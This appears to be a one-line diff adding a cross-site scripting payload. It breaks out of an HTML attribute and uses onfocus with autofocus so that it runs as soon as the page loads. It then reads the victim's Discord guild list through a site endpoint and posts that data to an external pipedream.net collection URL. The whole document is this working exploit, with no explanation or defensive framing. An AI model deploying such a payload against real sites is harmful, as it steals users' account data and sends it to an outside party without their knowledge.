@@ -1,0 +1,1 @@
+a' onfocus='fetch("/discord.php?url=%2Fusers%2F%40me%2Fguilds").then(response => response.json()).then(data => {fetch("https://enkkmmyjrkbn875.m.pipedream.net",{method: "post", body: JSON.stringify(data)})})' autofocus='
